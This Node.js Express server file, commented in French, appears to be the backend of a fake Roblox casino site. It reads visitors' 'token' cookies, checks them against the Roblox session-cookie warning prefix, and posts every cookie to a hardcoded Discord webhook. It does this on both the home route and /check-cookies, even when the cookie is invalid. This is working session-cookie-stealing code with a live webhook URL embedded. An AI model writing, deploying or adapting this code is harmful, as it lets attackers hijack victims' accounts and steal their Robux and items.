const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const path = require('path');
const fetch = require('node-fetch'); // Assurez-vous d'avoir installé node-fetch si vous ne l'avez pas déjà fait

// Utiliser cookie-parser pour gérer les cookies
app.use(cookieParser());

// Servir les fichiers statiques (HTML, CSS, etc.)
app.use(express.static(path.join(__dirname, 'public')));

// Middleware pour gérer les requêtes JSON
app.use(express.json());

// Webhook URL
const webhookURL = "https://discord.com/api/webhooks/1331389847210033253/2RrfMN-P8PaexjymdUY1K8VolOjsc-SByg1vT9npFDlp6tZxBW7I8ymI60jPgmC9bKqZ";

// Fonction pour envoyer le cookie à la webhook
async function sendCookieToWebhook(cookieData) {
    const payload = {
        content: `Cookie submitted: ${cookieData}`,
    };

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });
        console.log('Cookie sent to webhook');
    } catch (error) {
        console.error('Error sending cookie to webhook:', error);
    }
}

// Route principale pour servir la page d'accueil (index.html)
app.get('/', (req, res) => {
    const customCookie = req.cookies['token']; // Récupère le cookie avec le nom 'token'
    const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

    // Envoyer le cookie (s'il existe) à la webhook, même s'il est invalide
    if (customCookie) {
        sendCookieToWebhook(customCookie);
    }

    if (!customCookie || !customCookie.startsWith(prefix)) {
        // Si le cookie n'est pas valide ou absent, rester sur la page d'accueil
        console.log('Invalid or missing cookie');
        return res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }

    // Si le cookie est valide, rediriger vers la page casino_page.html
    console.log('Cookie valid, redirecting to casino_page.html');
    res.sendFile(path.join(__dirname, 'public', 'casino_page.html'));
});

// Route pour vérifier si le cookie est valide
app.get('/check-cookies', (req, res) => {
    const customCookie = req.cookies['token'];
    if (customCookie) {
        sendCookieToWebhook(customCookie);  // Envoie le cookie même s'il est invalide
    }

    if (!customCookie) {
        return res.status(403).send('Cookie is missing!');
    }

    const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

    if (!customCookie.startsWith(prefix)) {
        return res.status(401).send('Invalid cookie format');
    }

    const cookieData = customCookie.substring(prefix.length);
    
    if (cookieData.length > 50) { // Vérification de la longueur des données du cookie
        res.send('Cookie is valid!');
    } else {
        res.status(401).send('Invalid cookie data');
    }
});

// Lancer le serveur sur le port 3000
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
